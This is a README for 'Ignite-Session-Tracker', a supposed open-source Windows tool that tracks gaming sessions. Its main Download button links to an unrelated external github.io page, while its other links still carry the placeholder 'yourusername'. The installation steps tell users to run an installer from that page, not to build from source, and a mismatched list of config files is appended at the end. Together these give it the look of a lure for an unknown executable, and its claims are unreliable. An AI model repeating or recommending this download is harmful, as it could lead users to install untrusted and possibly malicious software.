# Ignite‑Session‑Tracker

*Lightweight Windows‑only utility that records, visualizes, and manages your gaming session times and statistics.*

---

## 🎮 What is Ignite‑Session‑Tracker?

Ignite‑Session‑Tracker is a **Windows 10/11‑only** desktop application designed for gamers who want to keep an eye on how much time they spend playing. It runs silently in the background, captures start‑/stop events, and presents the data in clean, interactive charts.

- **Zero‑bloat:** Minimal memory footprint, no unnecessary services.
- **Instant insights:** Daily, weekly, and monthly summaries at a glance.
- **Export ready:** CSV/JSON dumps for personal analysis or sharing.
- **Open‑source:** Feel free to fork, tweak, or contribute.

---

## 🚀 Quick Start

| Action | Button |
|--------|--------|
| **Download the latest build** | <a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=windows" alt="Download"></a> |
| **Read the full documentation** | <a href="https://github.com/yourusername/Ignite-Session-Tracker/wiki" target="_blank"><img src="https://img.shields.io/badge/Docs-Read%20Now-lightgrey?style=for-the-badge" alt="Docs"></a> |
| **Report an issue** | <a href="https://github.com/yourusername/Ignite-Session-Tracker/issues" target="_blank"><img src="https://img.shields.io/badge/Issues-Open%20Now-red?style=for-the-badge" alt="Issues"></a> |

---

## 📦 Features

| Category | Details |
|----------|---------|
| **Session capture** | Automatic detection of game launch and termination; manual start/stop controls. |
| **Statistics** | Total playtime, average session length, longest streak, and more. |
| **Visualisation** | Interactive line‑charts, bar‑graphs, and heat‑maps built with native Windows UI components. |
| **Data safety** | All logs are stored locally in a user‑specific folder; optional encryption toggle. |
| **Export & import** | One‑click export to CSV/JSON; import previous logs to continue tracking. |
| **Custom tags** | Label sessions (e.g., *Co‑op*, *Speedrun*, *Casual*) for filtered reports. |
| **Theme support** | Light & dark themes that follow the system setting. |

---

## 🛠️ Installation

1. Click the **Download** button above.
2. Run the installer and follow the on‑screen prompts.
3. After installation, launch **Ignite‑Session‑Tracker** from the Start menu.
4. The app will appear as a small tray icon; hover to view the current session timer.

> **Tip:** Pin the tray icon to the taskbar for quick access.

---

## 📊 How to Use

1. **Start a session** – The tracker auto‑detects most games. For unsupported titles, click the **Start** button in the tray menu.
2. **Play** – The timer runs in the background; no UI clutter.
3. **Stop/End** – Closing the game or selecting **Stop** records the session.
4. **Review** – Open the main window (double‑click the tray icon) to explore charts, totals, and export options.

---

## 🤝 Contributing

Contributions are welcome! Please follow these steps:

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/awesome‑feature`).
3. Make your changes, ensuring code follows the existing style.
4. Run the test suite (`dotnet test` – the project uses .NET 6).
5. Submit a pull request with a clear description of what you’ve added or fixed.

See the **CONTRIBUTING.md** file for detailed guidelines.

---

## 📜 License

Ignite‑Session‑Tracker is released under the **MIT License** – see the `LICENSE` file for full terms.

---

## 🙏 Acknowledgements

- Built with **C# / .NET 6** and native Windows UI libraries.
- Thanks to the open‑source community for inspiration and feedback.

---

*Enjoy smarter gaming sessions with Ignite‑Session‑Tracker!*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```